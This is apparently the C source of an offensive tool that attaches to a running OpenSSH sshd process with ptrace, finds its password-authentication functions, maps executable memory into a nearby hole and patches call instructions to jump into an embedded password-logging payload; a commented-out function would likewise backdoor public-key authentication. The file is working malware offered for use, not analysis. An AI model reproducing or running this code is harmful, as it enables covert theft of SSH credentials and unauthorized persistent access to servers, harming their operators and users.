#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <elf.h>
#include <link.h>
#include <types.h>
#include <common.h>
#include <map.h>
#include <inject.h>
#include <sig.h>
#include <ptrace.h>
#include <callcache.h>
#include <util.h>
#include <elflib.h>

extern unsigned char hook_passlog_bin[];
extern int hook_passlog_bin_len;

u8 *dynsym, *dynstr;
u64 dynsym_base, dynstr_base;
int dynsym_sz, dynstr_sz;

u8 *symtab, *strtab;
u64 symtab_base, strtab_base;
int symtab_sz, strtab_sz;

u8 *got;
u64 got_base;
int got_sz;

u64 resolve_symbol_tab(inject_ctx *ctx, char *name) {
	u64 sym;

	if (dynsym != 0 && dynstr != 0) {
		sym = resolve_symbol(dynsym, dynsym_sz, (char*)dynstr, name);
	}

	if (sym == 0 && symtab != 0 && strtab != 0) {
		sym = resolve_symbol(symtab, symtab_sz, (char*)strtab, name);
	}

	if (sym != 0) {
		sym += ctx->elf_base;
	}

	return sym;
}

// find a neighborly memoryhole where we can mmap
u64 find_hole(inject_ctx *ctx, u64 call, u32 size) {
	mem_mapping *m1, *m2;
	u64 hole_addr = 0;
	int i;
	
	for(i = 0; i < ctx->num_maps; i++) {
		m1 = ctx->mappings[i];
		m2 = ctx->mappings[i+1];

		if(
			call >= m1->start &&
			m2->start > (m1->end + size)
		) {
			hole_addr = m1->end;

			break;
		}
	}
	
	return hole_addr;
}

/*
void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
	signature signatures[]={
		{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
		{ 0xaaaaaaaabbbbbbbb, "key_new"    , "key_new: RSA_new failed"  , 0 },
		{ 0x1111111122222222, "key_read"   , "key_read: type mismatch: ", 0 },
		{ 0x3333333344444444, "key_equal"  , "key_equal: bad"           , 0 },
		{ 0x5555555566666666, "key_free"   , "key_free: "               , 0 },
		{ 0x99999999aaaaaaaa, "restore_uid", "restore_uid: %u/%u"       , 0 },
	};

	u8 *evil_bin;
	int i, j;
	u32 callcache_total, num_key_allowed2_calls=0;
	char line[255];
	callcache_entry *callcache, *entry;
	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
	u64 diff=0, hole_addr=0;

	evil_bin = malloc(evil_hook_size);
	memcpy(evil_bin, evil_hook, evil_hook_size);

	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
		signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
		if (signatures[i].addr == 0) {
			error("%s not found :(\n", signatures[i].name);
		}

		sprintf(line, 
			"%s\t\t= \x1b[37m0x%lx",
			signatures[i].name, signatures[i].addr
		);

		for(j = 0; j < evil_hook_size - 8; j++) {
			u64 *vptr = (u64*)&evil_bin[j];
			if (*vptr == signatures[i].placeholder) {
				sprintf(
					line+strlen(line), 
					" .. [%lx] at offset %x in evil_bin!", 
					signatures[i].placeholder, j
				);

				*vptr = signatures[i].addr;
				break;
			}
		}
		info(line);
	}

	callcache = get_callcache();
	callcache_total = get_callcachetotal();

	for(i=0; i<callcache_total; i++) {
		entry = &callcache[i];
		if (entry->dest == signatures[0].addr) {
			info("found a 'call user_key_allowed' @ 0x%lx", entry->addr);
			user_key_allowed2_calls[num_key_allowed2_calls] = entry->addr;
			num_key_allowed2_calls++;
		}
	}

	if (num_key_allowed2_calls == 0)
		error("no call to user_key_allowed2 found :(");

	hole_addr = find_hole(ctx, user_key_allowed2_calls[0], 1000);
	
	if (hole_addr == 0) {
		error("unable to find neighborly hole.");
	}

	info("found usable hole @ 0x%lx", hole_addr);

	info2("entering critical phase");

	_mmap(
		ctx, (void*)hole_addr, 0x1000,
		PROT_READ| PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
		0, 0
	);

	for(i=0; i<num_key_allowed2_calls; i++) {
		diff = 0x100000000-(user_key_allowed2_calls[i]-hole_addr)-5;

		info(
			"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
			user_key_allowed2_calls[i], hole_addr,
			diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
		);

		_poke(ctx->pid, user_key_allowed2_calls[i]+1, &diff, 4);
	}

	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
	_poke(ctx->pid, hole_addr+(evil_hook_size), pubkey, strlen(pubkey));
	info("poked evil_bin to 0x%lx.", hole_addr);
	
}
*/

void password_backdoor(inject_ctx *ctx) {
	u8 privsep_jnz[2]={0,0};

	u64 use_privsep=0, logit_passchange=0, privsep_load=0, privsep_test=0;
	u64 auth_password=0, mm_auth_password=0;
	u64 *auth_password_calls = NULL, *mm_auth_password_calls = NULL;
	int i, j, n_auth_password_calls, n_mm_auth_password_calls;
	u64 diff=0, hole_addr=0;
	u8 *evil_bin;
	u32 use_privsep_val=0;

	evil_bin = malloc(hook_passlog_bin_len);
	memcpy(evil_bin, hook_passlog_bin, hook_passlog_bin_len);

	use_privsep = resolve_symbol_tab(ctx, "use_privsep");

	if (use_privsep == 0) {
		error("could not locate use_privsep :(");
	}

	info("found use_privsep\t\t= 0x%llx", use_privsep);

	logit_passchange = lea_by_debugstr(
		ctx, LEA_RDI, "password change not supported"
	);

	info("logit(\"password change..\")\t= 0x%llx", logit_passchange);

	privsep_load = find_prev_load(ctx, LOAD_LEA, LEA_RAX, logit_passchange, use_privsep);
	
	// load instruction wasn't a lea, search for mov rax, privsep_ptr
	if (privsep_load == 0) {
		u64 privsep_ptr = 0x0, *ptr = (u64 *)got;
		int i;
		
		// loop over all pointers in the .got
		for (i = 0; i < (got_sz / sizeof(u64)); i++) {
			// find the entry that points to use_privsep
			if (ptr[i] == (use_privsep - ctx->elf_base)) {
				privsep_ptr = ctx->elf_base + got_base + (i * sizeof(u64));
				break;				
			}
		}
	
		if (privsep_ptr == 0)
			error("could not find privsep.");
	
		privsep_load = find_prev_load(ctx, LOAD_MOV, LEA_RAX, 
									 logit_passchange, privsep_ptr);
									 
		info("mov rax, privsep_ptr\t= 0x%llx", privsep_load);
	} else {
		info("lea rax, privsep\t\t= 0x%llx", privsep_load);
	}

	privsep_test = find_next_opcode(ctx, privsep_load, (u8*)"\x85\xc0", 2);
	info("privsep test\t\t= 0x%llx", privsep_test);

	_peek(ctx->pid, privsep_test+2, privsep_jnz, 2);

	if (privsep_jnz[0] != 0x75) {
		error("wtf du0d.. the next insn is not a jnz.. wtf..");
		exit(-1);
	}

	auth_password = resolve_call_insn(ctx, privsep_test+4);
	info("auth_password\t\t= 0x%llx", auth_password);

	mm_auth_password = resolve_call_insn(ctx, privsep_test+4+privsep_jnz[1]);
	info("mm_auth_password\t\t= 0x%llx", mm_auth_password);
	
	n_auth_password_calls = find_calls(&auth_password_calls, auth_password);
	n_mm_auth_password_calls = find_calls(&mm_auth_password_calls, mm_auth_password);
	
	if (n_auth_password_calls == 0)
		error("No calls to auth_password found.");
	
	if (n_mm_auth_password_calls == 0)
		error("No calls to mm_auth_password found.");
	
	hole_addr = find_hole(ctx, auth_password_calls[0], 1000);
	
	if (hole_addr == 0) {
		error("unable to find neighborly hole.");
	}

	info("found usable hole @ 0x%lx", hole_addr);

	info2("entering critical phase");
	
	_mmap(
		ctx, (void*)hole_addr, 0x1000,
		PROT_READ| PROT_WRITE | PROT_EXEC,
		MAP_ANONYMOUS | MAP_SHARED | MAP_FIXED,
		0, 0
	);

	_peek(ctx->pid, use_privsep, &use_privsep_val, 4);
	
	if (use_privsep_val) {
		// Patch mm_auth_password
		for (i = 0; i < n_mm_auth_password_calls; i++) {
			diff = 0x100000000-(mm_auth_password_calls[i]-hole_addr)-5;

			info(
				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
				mm_auth_password_calls[i], hole_addr,
				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
			);

			_poke(ctx->pid, mm_auth_password_calls[i]+1, &diff, 4);
		}
	} else {
		// Patch auth_password
		for (i = 0; i < n_auth_password_calls; i++) {
			diff = 0x100000000-(auth_password_calls[i]-hole_addr)-5;

			info(
				"building a bridge [0x%lx->0x%lx] .. opcode = [E8 %02X %02X %02X %02X]",
				auth_password_calls[i], hole_addr,
				diff & 0xff, (diff>>8)&0xff, (diff>>16)&0xff, (diff>>24)&0xff
			);

			_poke(ctx->pid, auth_password_calls[i]+1, &diff, 4);
		}
	}
	
	// Insert return address
	for(j = 0; j < hook_passlog_bin_len; j++) {
		u64 *vptr = (u64*)&evil_bin[j];
		switch (*vptr) {
			case 0x1111111122222222:
				*vptr = use_privsep;
				break;
			case 0x3333333344444444:
				*vptr = auth_password;
				break;
			case 0x5555555566666666:
				*vptr = mm_auth_password;
				break;
		}
	}

	_poke(ctx->pid, hole_addr, evil_bin, hook_passlog_bin_len);
	info("poked evil_bin to 0x%lx.", hole_addr);
	
	free(mm_auth_password_calls);
	free(auth_password_calls);
}

int main(int argc, char *argv[]) {
	char sshd_path[255], proc_exe[64];

	u32 nullw=0;
	u64 rexec_flag = 0;

	if (argc != 3) {
		fprintf(stderr, "usage: %s <pid>\n", argv[0]);
		return -1;
	}

	inject_ctx *ctx = malloc(sizeof(inject_ctx));

	ctx->pid = atoi(argv[1]);

	_attach(ctx->pid);
	info("slurping stuff to memory..");
	map_init();
	ctx->num_maps = map_load_all(ctx);
	info("loaded %d memory mappings", ctx->num_maps);

	ctx->mappings = get_mappings();

	sort_maps(ctx);

	memset(sshd_path, 0, 255);
	sprintf(proc_exe, "/proc/%d/exe", atoi(argv[1]));
	readlink(proc_exe, sshd_path, 255);

	info("sshd binary path = '%s'", sshd_path);

	// locate syscall instruction
	ctx->sc_addr = find_sig_mem(ctx, (u8*)"\x0f\x05", 2, MEM_R | MEM_X);
	info("syscall\t\t\t= \x1b[37m0x%lx", ctx->sc_addr);

	// load symtabs
	dynsym_sz = get_section(sshd_path, ".dynsym", &dynsym, &dynsym_base);
	dynstr_sz = get_section(sshd_path, ".dynstr", &dynstr, &dynstr_base);

	symtab_sz = get_section(sshd_path, ".symtab", &symtab, &symtab_base);
	strtab_sz = get_section(sshd_path, ".strtab", &strtab, &strtab_base);
	
	got_sz 	  = get_section(sshd_path, ".got", &got, &got_base);

	// find rexec_flag
	rexec_flag = resolve_symbol_tab(ctx, "rexec_flag");

	if (rexec_flag == 0) {
		u64 rexec_debug_lea = 0, rexec_test = 0;
		u32 rexec_flag_offset = 0;
		
		info("could not resolve rexec_flag :(, trying alternative method..");
		
		rexec_debug_lea = lea_by_debugstr(
			ctx, LEA_RDI, "Server will not fork when running in debugging mode."
		);
		
		// Find the first 'test eax, eax' instruction after the debug string
		rexec_test = find_next_opcode(ctx, rexec_debug_lea, (u8*)"\x85\xc0", 2);

		// Get the rexec_flag offset from rip		
		_peek(ctx->pid, rexec_test - 4, &rexec_flag_offset, 4);
		
		// Resolve absolute address of rip + rexec_flag_offset
		rexec_flag = rexec_test + rexec_flag_offset;
	}

	info("rexec_flag\t\t\t= 0x%lx", rexec_flag); 

	cache_calltable(ctx);

	password_backdoor(ctx);
	//pubkey_backdoor(ctx, argv[2]);

	info("switching off rexec..");
	_poke(ctx->pid, rexec_flag, &nullw, 4);

	_detach(ctx->pid);
	info("detached.\n");
	free(ctx);
	
	free_callcache();
	free(dynsym);
	free(dynstr);
	free(symtab);
	free(strtab);
	free(got);
	//free(my_homies);
	return 0;
}
